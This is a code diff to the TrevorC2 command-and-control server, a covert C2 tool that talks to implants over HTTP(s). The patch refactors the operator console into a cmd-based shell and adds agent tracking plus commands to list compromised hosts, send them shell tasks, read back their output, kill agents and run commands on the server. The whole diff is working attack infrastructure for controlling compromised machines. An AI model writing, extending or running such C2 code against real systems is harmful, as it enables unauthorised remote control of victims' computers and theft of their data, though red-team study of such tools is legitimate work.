@@ -77,8 +77,10 @@ except ImportError:
     print("[!] Python module tornado not installed. Try pip install tornado and re-run TrevorC2 Server.")
     sys.exit()
 import hashlib
+import cmd
 from Crypto import Random
 from Crypto.Cipher import AES
+from collections import UserList
 
 # asyncio is python3 only - only needed for python3 regardless for tornado fix
 python_version = ("")
@@ -93,7 +95,7 @@ logging.basicConfig(level=logging.CRITICAL, format='[%(asctime)s] %(message)s', 
 log = logging.getLogger(__name__)
 
 __author__ = 'Dave Kennedy (@HackingDave)'
-__version__ = 0.7
+__version__ = 0.71
 
 # ROOT CHECK
 if os.geteuid() != 0:
@@ -104,12 +106,115 @@ if os.geteuid() != 0:
 try: input = raw_input
 except NameError: pass
 
-# used for registering assets
-assets = []
-def register_assets(sessionid,hostname,remoteip):
-    global assets
-    asset = {'sessionid': sessionid, 'hostname': hostname, 'remoteip' : remoteip}
-    assets.append(asset)
+# CLASSES #
+class AgentClass: #Agent class
+    def __init__(self, sessionid, hostname, remoteip):
+        self.sessionid = sessionid
+        self.hostname = hostname
+        self.remoteip = remoteip
+        self.id = agent_list.get_max_id()+1 #Generate ID for agent
+        agent_list.append(self) #Add agent to global agent list
+
+class AgentListClass(UserList): #Agentlist class
+    def __init__(self):
+        super().__init__()
+
+    def get_agent(self, id):
+        for agent in self:
+            if agent.id == id:
+                return agent
+
+    def get_max_id(self):
+        if self != []:
+            id_list = []
+            for agent in self:
+                id_list.append(str(agent.id))
+            return int(max(id_list))
+        else:
+            return int(0)
+
+    def get_agents_id(self):
+        id_list = []
+        for agent in self:
+            id_list.append(str(agent.id))
+        return id_list
+
+class TrevorPrompt(cmd.Cmd): #prompt class
+    def __init__(self):
+        super().__init__()
+    intro = "Trevor C2 shell"
+    prompt = 'trevorc2>'
+    completekey = 'tab'
+
+    def do_exit(self, inp):
+        print("[*] Exiting TrevorC2")
+        return True
+    
+    def help_exit(self):
+        print("Exits TrevorC2")
+
+    def do_interact(self, inp):
+        try:
+            agent = agent_list.get_agent(int(inp))
+            print("\n*** interact with {} {}.".format(agent.hostname,agent.sessionid))
+            print("[*] Dropping into trevorc2 shell...")
+            print("[*] Use exit or back to select other shells")
+            while 1:
+                task = input(agent.hostname + ":trevorc2>")
+                origtask = task
+                if task == "quit" or task == "exit" or task == "back": break
+                task = (agent.hostname + "::::" + task)
+                set_instruction(agent.sessionid,task)
+                if origtask == "killnow":
+                    print("[*] Killing agent, and dropping from console!")
+                    break;
+                print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
+                while 1:
+                    # we received a hit with our command
+                    if os.path.isfile("clone_site/received_" + agent.sessionid + ".txt"):
+                        data = open("clone_site/received_" + agent.sessionid + ".txt", "r").read()
+                        print("[*] Received response back from client...")
+                        print(data)
+                        # remove this so we don't use it anymore
+                        os.remove("clone_site/received_" + agent.sessionid + ".txt")
+                        break
+                    time.sleep(.3)
+        except ValueError:
+            print("Something wong")
+    
+    def complete_interact(self, text, line, begidx, endidx):
+        agent_ids = agent_list.get_agents_id()
+        return [i for i in agent_ids if i.startswith(text)]
+
+    def help_interact(self):
+        print("Description: Starts an interactive shell with agent")    
+        print("Usage: interact <id>")  
+
+    def do_list(self, inp):
+        if agent_list == []:
+            print("No available Agents. :-(")
+        else:
+            print("%-4s%-24s%-18s%-13s" % (
+            "id", "hostname", "ip address", "communication_sessionid"))
+            for agent in agent_list:
+                print("%-4s%-24s%-18s%-13s" % (
+                    str(agent.id), agent.hostname, agent.remoteip, agent.sessionid))
+
+    def help_list(self):
+        print("Description: Lists all available agents")    
+        print("Usage: list")
+
+    def do_servercmd(self, inp):
+        stdout = subprocess.Popen(inp, shell=True)
+        proc = stdout.communicate()[0]
+        print(proc)
+    
+    def help_servercmd(self):
+        print("Description: Run command on the server")    
+        print("Usage: servercmd <command>")
+        print("Example: servercmd ifconfig")
+
+
 
 def randomString():
     """Generate a random string of fixed length """
@@ -315,7 +420,7 @@ class SPQ(tornado.web.RequestHandler):
         # register hostnames
         if "magic_hostname=" in query_output:
             hostname = query_output.split("=")[1]
-            register_assets(sid,hostname,remote_ip)
+            newagent = AgentClass(sid, hostname, remote_ip)
             set_instruction(sid,"nothing")
             print("\n*** Received connection from {} and hostname {} with communication sid {} for TrevorC2.".format(remote_ip, hostname,sid))
         else:
@@ -326,6 +431,10 @@ class SPQ(tornado.web.RequestHandler):
             set_instruction(sid,"nothing")
 
 def main_c2():
+    ### Init list ###
+    global agent_list
+    agent_list = AgentListClass()
+    
     """Start C2 Server."""
     application = tornado.web.Application([
         (ROOT_PATH_QUERY, RPQ),
@@ -409,86 +518,13 @@ if __name__ == "__main__":
     print("[*] Client uses random intervals, this may take a few.")
     print("[*] Type help for usage. Example commands, list, interact.\n")
     try:
-        while 1:
-            task = input("trevorc2>")
-            if task == "help" or task == "?":
-                print("*** TrevorC2 Help Menu ***\n\n")
-                print("Command Usage:\n")
-                print("list - will list all shells available")
-                print("interact <id> - allow you to select which shells to interact with\n")
-                print("ifconfig - allows you to see your interface data for server")
+        ### INIT Main Command line ###
+        commandline = TrevorPrompt()
+        commandline.cmdloop()
+        os._exit(0)
 
-            # list available shells
-            elif task == "list":
-                counter = 0
-                print("\n*** Available TrevorC2 Shells Below ***\n")
-                if assets == []:
-                    print("No available TrevorC2 shells.")
-                else:
-                    print("Format: <session_id> <hostname>:<ipaddress>:<communication_sessionid>\n")
-                    for a in assets:
-                        counter = counter + 1
-                        print(str(counter) + ". " + a['hostname'] + " " + a['remoteip'] + " " + a['sessionid']  + " (Trevor C2 Established)")
-                print("\n")
-
-            elif task == "interact": print("[!] Correct usage: interact <session_id>")
-
-            elif task == "ifconfig":
-                stdout = subprocess.Popen("ifconfig", shell=True)
-                proc = stdout.communicate()[0]
-                print(proc)
-
-            elif task == "quit" or task == "exit":
-                print("[*] Exiting TrevorC2... ")
-                os.system('kill $PPID') # This is an ugly method to kill process, due to threading this is a quick hack to kill with control-c. Will fix later.
-
-            elif "interact " in task:
-                if assets != []:
-                    hostname_sessionid = task.split(" ")[1]
-                    try:
-                        hostname_select = int(hostname_sessionid) - 1
-                    except ValueError:
-                        hostname_select = hostname_sessionid
-                    if isinstance(hostname_select, int):
-                        if (hostname_select < len(assets)) and (hostname_select > -1):
-                            hostname = assets[hostname_select]['hostname']
-                            sid = assets[hostname_select]['sessionid']
-                            print("\n*** interact with {} {}.".format(hostname,sid))
-                            print("[*] Dropping into trevorc2 shell...")
-                            print("[*] Use exit or back to select other shells")
-                            while 1:
-                                task = input(hostname + ":trevorc2>")
-                                origtask = task
-                                if task == "quit" or task == "exit" or task == "back": break
-                                task = (hostname + "::::" + task)
-                                set_instruction(sid,task)
-                                if origtask == "killnow":
-                                    print("[*] Killing agent, and dropping from console!")
-                                    break;
-                                print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
-                                while 1:
-                                    # we received a hit with our command
-                                    if os.path.isfile("clone_site/received_" + sid + ".txt"):
-                                        data = open("clone_site/received_" + sid + ".txt", "r").read()
-                                        print("[*] Received response back from client...")
-                                        print(data)
-                                        # remove this so we don't use it anymore
-                                        os.remove("clone_site/received_" + sid + ".txt")
-                                        break
-                                    time.sleep(.3)
-                        else :
-                             print("[!] Session id {} does not exist.".format(hostname_sessionid))
-                    else :
-                         print("[!] Session id {} is not a valid session id.".format(hostname_sessionid))
-                else:
-                    print("[!] No sessions have been established to execute commands.")
-
-            else:
-                if task !="":
-                    print("[!] Command not recognized. Type help for more information.")
-
-    # cleanup when using keyboardinterrupt
     except KeyboardInterrupt:
         if os.path.isdir("clone_site/"): shutil.rmtree("clone_site/")
         print("\n\n[*] Exiting TrevorC2, covert C2 over legitimate HTTP(s).")
-        os.system('kill $PPID') # This is an ugly method to kill process, due to threading this is a quick hack to kill with control-c. Will fix later.
+        os._exit(0)
+    #   os.system('kill $PPID') # This is an ugly method to kill process, due to threading this is a quick hack to kill with control-c. Will fix later.
